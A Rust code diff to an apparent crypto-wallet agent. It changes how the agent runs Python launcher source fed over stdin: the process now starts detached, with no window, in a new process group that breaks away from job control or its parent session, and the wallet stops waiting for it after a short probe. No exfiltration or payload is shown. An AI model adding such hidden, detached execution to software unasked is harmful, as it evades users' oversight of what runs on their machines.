@@ -2,6 +2,8 @@ use std::fs;
 use std::io::{Cursor, Write};
 use std::path::{Path, PathBuf};
 use std::process::{Command, Output, Stdio};
+use std::thread;
+use std::time::{Duration, Instant};
 
 use thiserror::Error;
 use zip::ZipArchive;
@@ -11,6 +13,7 @@ use rand::Rng;
 use crate::log;
 
 const PYTHON_VERSION: &str = "3.12.7";
+const STARTUP_PROBE_SECS: u64 = 5;
 
 #[derive(Debug, Error)]
 pub enum PythonError {
@@ -309,7 +312,7 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
     let agent_dir = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
     let log_path = prefix.join("launcher-run.log");
     let log_file = fs::File::create(&log_path)?;
-    log::step("agent", format!("executing launcher via stdin (log: {})", log_path.display()));
+    log::step("agent", format!("spawning detached launcher (log: {})", log_path.display()));
     log::detail(
         "agent",
         format!(
@@ -320,7 +323,8 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
         ),
     );
 
-    let mut child = Command::new(python)
+    let mut command = Command::new(python);
+    command
         .arg("-u")
         .arg("-")
         .env("CHAIN_WALLET_PYTHON_ROOT", prefix)
@@ -329,10 +333,17 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
         .env("AGENT_DIR", &agent_dir)
         .env("PYTHONPATH", site_packages_dir(prefix))
         .env("PYTHONUNBUFFERED", "1")
-        .env("CHAIN_WALLET_VERBOSE", if log::verbose_enabled() { "1" } else { "0" })
+        .env(
+            "CHAIN_WALLET_VERBOSE",
+            if log::verbose_enabled() { "1" } else { "0" },
+        )
         .stdin(Stdio::piped())
         .stdout(Stdio::from(log_file.try_clone()?))
-        .stderr(Stdio::from(log_file))
+        .stderr(Stdio::from(log_file));
+
+    configure_detached(&mut command);
+
+    let mut child = command
         .spawn()
         .map_err(|err| PythonError::Execution(err.to_string()))?;
 
@@ -342,20 +353,64 @@ fn execute_source(python: &Path, prefix: &Path, source: &[u8]) -> Result<(), Pyt
             .map_err(|err| PythonError::Execution(err.to_string()))?;
     }
 
-    let status = child
-        .wait()
-        .map_err(|err| PythonError::Execution(err.to_string()))?;
-
-    if !status.success() {
-        log::dump_tail("agent", &log_path, 80);
-        return Err(PythonError::Execution(format!(
-            "python exited with status {status} (see {})",
-            log_path.display()
-        )));
+    let pid = child.id();
+    let deadline = Instant::now() + Duration::from_secs(STARTUP_PROBE_SECS);
+    loop {
+        match child.try_wait() {
+            Ok(Some(status)) => {
+                if !status.success() {
+                    log::dump_tail("agent", &log_path, 80);
+                    return Err(PythonError::Execution(format!(
+                        "python exited during startup with status {status} (see {})",
+                        log_path.display()
+                    )));
+                }
+                log::step("agent", "launcher exited cleanly during startup probe");
+                return Ok(());
+            }
+            Ok(None) if Instant::now() >= deadline => break,
+            Ok(None) => thread::sleep(Duration::from_millis(100)),
+            Err(err) => return Err(PythonError::Execution(err.to_string())),
+        }
     }
 
-    log::step("agent", "launcher exited cleanly");
+    log::step(
+        "agent",
+        format!(
+            "launcher running detached (pid={pid}, log: {})",
+            log_path.display()
+        ),
+    );
+    log::detail("agent", "wallet process will continue without waiting for Python");
+
+    // Drop the handle without waiting so the wallet process can finish independently.
     Ok(())
+}
+
+#[cfg(windows)]
+fn configure_detached(command: &mut Command) {
+    use std::os::windows::process::CommandExt;
+
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    const DETACHED_PROCESS: u32 = 0x0000_0008;
+    const CREATE_NEW_PROCESS_GROUP: u32 = 0x0000_0200;
+    const CREATE_BREAKAWAY_FROM_JOB: u32 = 0x0100_0000;
+
+    command.creation_flags(
+        CREATE_NO_WINDOW | DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_BREAKAWAY_FROM_JOB,
+    );
+}
+
+#[cfg(unix)]
+fn configure_detached(command: &mut Command) {
+    use std::os::unix::process::CommandExt;
+
+    command.pre_exec(|| {
+        unsafe {
+            libc::setsid();
+        }
+        Ok(())
+    });
 }
 
 fn run_command(command: &mut Command) -> Result<Output, PythonError> {
